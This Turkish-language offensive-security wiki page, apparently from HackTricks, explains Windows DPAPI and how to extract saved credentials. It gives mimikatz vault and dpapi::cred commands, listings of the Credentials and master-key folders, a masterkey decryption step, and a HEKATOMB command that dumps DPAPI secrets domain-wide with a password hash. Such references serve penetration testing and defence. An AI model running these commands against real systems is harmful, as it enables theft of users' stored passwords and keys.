# DPAPI - Şifrelerin Çıkarılması

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) **İspanya**'daki en önemli siber güvenlik etkinliği ve **Avrupa**'daki en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## DPAPI Nedir

Data Protection API (DPAPI), esasen Windows işletim sisteminde **asimetrik özel anahtarların simetrik şifrelemesi** için kullanılmaktadır ve kullanıcı veya sistem sırlarını önemli bir entropi kaynağı olarak kullanmaktadır. Bu yaklaşım, geliştiricilerin kullanıcı oturum açma sırlarından veya sistem şifrelemesi için sistemin alan kimlik doğrulama sırlarından türetilen bir anahtar kullanarak verileri şifrelemelerine olanak tanıyarak şifrelemeyi basitleştirir; böylece geliştiricilerin şifreleme anahtarının korunmasını kendilerinin yönetmesine gerek kalmaz.

### DPAPI ile Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunmaktadır:

- Internet Explorer ve Google Chrome'un şifreleri ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap şifreleri
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için şifreler, şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar için şifreler
- Credential Manager tarafından yönetilen ağ şifreleri ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kimlik Bilgisi Dosyaları

**Korunan kimlik bilgisi dosyaları** şunlarda bulunabilir:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Mimikatz `dpapi::cred` kullanarak kimlik bilgileri bilgilerini alın, yanıtınızda şifreli veriler ve guidMasterKey gibi ilginç bilgiler bulabilirsiniz.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz modülünü** `dpapi::cred` uygun `/masterkey` ile şifre çözmek için kullanabilirsiniz:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

DPAPI anahtarları, kullanıcının RSA anahtarlarını şifrelemek için `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada {SID} o kullanıcının [**Güvenlik Tanımlayıcısı**](https://en.wikipedia.org/wiki/Security_Identifier) **dır**. **DPAPI anahtarı, kullanıcıların özel anahtarlarını koruyan ana anahtar ile aynı dosyada saklanır**. Genellikle 64 bayt rastgele veriden oluşur. (Bu dizinin korunduğunu unutmayın, bu nedenle `dir` komutunu kullanarak listeleyemezsiniz, ancak PS'den listeleyebilirsiniz).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının bir dizi Master Key'inin nasıl görüneceğidir:

![](<../../images/image (1121).png>)

Genellikle **her master key, diğer içeriği şifreleyebilen bir şifreli simetrik anahtardır**. Bu nedenle, **şifreli Master Key'i çıkarmak**, daha sonra bununla şifrelenmiş **diğer içeriği** **şifrelemek** için ilginçtir.

### Master key'i çıkar ve şifreyi çöz

Master key'i çıkarmak ve şifreyi çözmek için bir örnek için [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) gönderisine bakın.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1), [@gentilkiwi](https://twitter.com/gentilkiwi)'nin [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projesinden bazı DPAPI işlevselliğinin C# portudur.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizininden tüm kullanıcıların ve bilgisayarların çıkarılmasını ve alan denetleyici yedek anahtarının RPC üzerinden çıkarılmasını otomatikleştiren bir araçtır. Script, ardından tüm bilgisayarların IP adreslerini çözecek ve tüm kullanıcıların tüm DPAPI blob'larını almak için tüm bilgisayarlarda smbclient gerçekleştirecek ve her şeyi alan yedek anahtarı ile şifre çözecektir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılan bilgisayar listesi ile, onları bilmeseniz bile her alt ağı bulabilirsiniz!

"Çünkü Alan Yönetici hakları yeterli değil. Hepsini hackle."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dökebilir.

## Referanslar

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **İspanya**'daki en ilgili siber güvenlik etkinliği ve **Avrupa**'daki en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

{{#include ../../banners/hacktricks-training.md}}
